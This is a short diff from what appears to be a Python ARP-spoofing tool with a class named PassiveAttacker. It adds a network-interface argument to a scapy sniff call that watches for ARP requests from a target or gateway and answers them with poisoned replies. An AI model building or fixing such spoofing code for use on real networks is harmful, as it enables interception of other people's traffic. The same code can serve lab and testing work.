@@ -213,7 +213,7 @@ class PassiveAttacker:
             f"(src host {arper.target} or src host {arper.gateway}) "
             f"and arp and arp[6:2] = 1"
         )
-        sniff(filter=bpf_filter, prn=self.spoof, store=0)
+        sniff(filter=bpf_filter, prn=self.spoof, store=0, iface=arper.interface)
 
     def spoof(self, packet):
         pkt = self.poison_target if packet[ARP].psrc == self.target else self.poison_gateway
